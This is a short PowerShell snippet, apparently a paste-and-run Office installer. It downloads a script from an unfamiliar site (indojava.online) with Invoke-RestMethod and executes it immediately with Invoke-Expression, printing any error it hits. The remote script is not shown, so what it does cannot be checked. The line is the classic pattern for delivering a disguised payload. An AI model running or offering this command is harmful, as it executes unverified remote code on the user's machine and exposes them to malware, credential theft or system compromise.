try {
  iex (irm 'https://indojava.online/get/installoffice')
} catch {
  $_ | Format-List * -Force
}